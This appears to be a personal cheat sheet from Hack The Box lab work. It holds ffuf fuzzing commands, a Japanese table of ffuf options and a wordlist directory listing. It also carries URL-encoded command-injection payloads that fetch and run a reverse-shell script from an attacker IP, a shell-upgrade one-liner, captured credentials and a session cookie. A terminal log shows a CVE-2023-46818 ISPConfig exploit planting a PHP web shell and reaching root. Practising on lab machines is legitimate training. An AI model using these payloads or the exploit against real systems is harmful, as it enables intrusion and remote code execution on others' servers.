ffuf -w WORDLIST -u URL_WITH_FUZZ
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target/FUZZ]
ffuf -u http://planning.htb/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://10.10.11.68' -H "Host:FUZZ.planning.htb" -fs 178

ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u http://runner.htb -H 'HOST: FUZZ.runner.htb'

ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" -w ~/tool/SecLists/Discovery/DNS/namelist.txt -fs 0,178 -t 100

ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt \
     -u http://soulmate.htb \
     -H 'Host: FUZZ.soulmate.htb' \
     -ac


ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=file.pdf' -fs 2985 -b "PHPSESSID=ugsor4o8ml0nfr4trbarkrcqu4"

arHkG7HAI68X8s1J
slowmotionapocalypse
%0abash%09-c%09"wget%09http://10.10.14.16:9090/re.sh%0abashre.sh%0a&backup=
%0abash%09-c%09"wget%09-o%09/dev/shm/shell.sh%09http://10.10.14.16:9090/re.sh
pass"%0abash%09-c%09/dev/shm/re.sh%0a
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

%0abash%09-c%09\"bash%09rev.sh
%0abash%09-c%09\"wget%09http://10.10.14.16:9090/rev.sh

┌──(kali㉿kali)-[~/HTB]
└─$ python3 CVE-2023-46818.py http://127.0.0.1:8080 admin slowmotionapocalypse
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login successful!
[+] Fetching CSRF tokens...
[+] CSRF ID: language_edit_94c58a76833fccb5d7040b2c
[+] CSRF Key: 7643e6714ea1426e94d8f28bcabab28d7a62fd62
[+] Injecting shell payload...
[+] Shell written to: http://127.0.0.1:8080/admin/sh.php
[+] Launching shell...

ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)

| オプション | 説明                              |     |
| ----- | ------------------------------- | --- |
| `-w`  | ワードリスト（必須）                      |     |
| `-u`  | URL。`FUZZ` を入れる                 |     |
| `-t`  | 並列スレッド数（例: `-t 100`）            |     |
| `-mc` | マッチするHTTPステータスコード（例: `-mc 200`） |     |
| `-fs` | 無視したいレスポンスサイズ（例: `-fs 1234`）    |     |
| `-fc` | 無視したいステータスコード（例: `-fc 403`）     |     |
| `-ac` | 自動で同一レスポンスを除外（Auto Calibrate）   |     |
| `-o`  | 出力ファイル                          |     |
| `-of` | 出力形式（`csv`, `json`, `html`など）   |     |

┌──(kali㉿kali)-[/usr/…/wordlists/seclists/Discovery/DNS]
└─$ ls
bitquark-subdomains-top100000.txt                     deepmagic.com-prefixes-top500.txt  FUZZSUBS_CYFARE_2.txt   README.md                sortedcombined-knock-dnsrecon-fierce-reconng.txt  subdomains-top1million-5000.txt
bug-bounty-program-subdomains-trickest-inventory.txt  dns-Jhaddix.txt                    italian-subdomains.txt  services-names.txt       subdomains-spanish.txt                            tlds.txt
combined_subdomains.txt                               fierce-hostlist.txt                n0kovo_subdomains.txt   shubs-stackoverflow.txt  subdomains-top1million-110000.txt
deepmagic.com-prefixes-top50000.txt                   FUZZSUBS_CYFARE_1.txt              namelist.txt            shubs-subdomains.txt     subdomains-top1million-20000.txt
                                                                                                                                                                        